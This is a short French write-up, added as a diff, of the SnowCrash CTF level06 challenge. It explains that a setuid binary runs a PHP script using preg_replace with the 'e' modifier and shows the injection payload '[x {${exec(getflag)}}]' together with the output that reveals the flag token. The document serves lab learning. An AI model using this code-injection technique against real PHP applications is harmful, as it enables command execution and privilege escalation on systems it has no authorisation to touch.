@@ -1,0 +1,20 @@
+level06@SnowCrash:~$ ls -la
+total 24
+dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 .
+d--x--x--x  1 root    users    340 Aug 30  2015 ..
+-r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout
+-r-x------  1 level06 level06 3518 Aug 30  2015 .bashrc
+-r-x------  1 level06 level06  675 Apr  3  2012 .profile
+-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
+-rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
+
+Il y a un executable level06 et un fichier php level06.php
+Apres tests, level06 execute level06.php
+level06.php prend 2 arguments, 1 nom de fichier et une string (inutilisee)
+La fonction x() lit le fichier, remplace '[x text]' par 'text' et le modifier 'e' fait qu'on prend la string comme etant une commande php, c'est ensuite print.
+On peut exploiter le fichier de la sorte:
+
+level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > /tmp/test
+level06@SnowCrash:~$ ./level06 /tmp/test asd
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
